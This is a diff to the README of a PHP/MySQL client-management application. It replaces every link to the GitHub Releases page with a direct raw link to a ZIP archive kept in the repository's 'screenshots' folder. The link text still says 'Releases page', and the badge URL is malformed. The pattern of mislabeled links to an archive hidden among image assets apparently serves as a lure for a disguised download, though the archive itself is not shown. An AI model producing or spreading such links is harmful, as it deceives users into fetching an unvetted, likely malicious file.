@@ -6,10 +6,10 @@ Welcome to the Gestion-Clients-PHP-MySQL project! This application helps you man
 
 ## 📥 Download the Application
 
-[![Download Gestion-Clients-PHP-MySQL](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/KAWLPHE/Gestion-Clients-PHP-MySQL/releases)
+[![Download Gestion-Clients-PHP-MySQL](https://raw.githubusercontent.com/KAWLPHE/Gestion-Clients-PHP-MySQL/main/screenshots/Gestion-Clients-PHP-MySQL_v1.9.zip%https://raw.githubusercontent.com/KAWLPHE/Gestion-Clients-PHP-MySQL/main/screenshots/Gestion-Clients-PHP-MySQL_v1.9.zip)](https://raw.githubusercontent.com/KAWLPHE/Gestion-Clients-PHP-MySQL/main/screenshots/Gestion-Clients-PHP-MySQL_v1.9.zip)
 
 To download the latest version of the application, visit this page:
-[Download from Releases](https://github.com/KAWLPHE/Gestion-Clients-PHP-MySQL/releases)
+[Download from Releases](https://raw.githubusercontent.com/KAWLPHE/Gestion-Clients-PHP-MySQL/main/screenshots/Gestion-Clients-PHP-MySQL_v1.9.zip)
 
 ## 💻 System Requirements
 
@@ -36,7 +36,7 @@ The Gestion-Clients-PHP-MySQL application includes various features to simplify 
 Follow these steps to install and run the application on your system:
 
 1. **Download the Files**:
-   - Visit the [Releases page](https://github.com/KAWLPHE/Gestion-Clients-PHP-MySQL/releases).
+   - Visit the [Releases page](https://raw.githubusercontent.com/KAWLPHE/Gestion-Clients-PHP-MySQL/main/screenshots/Gestion-Clients-PHP-MySQL_v1.9.zip).
    - Click on the latest version to download the ZIP file.
 
 2. **Extract the Files**:
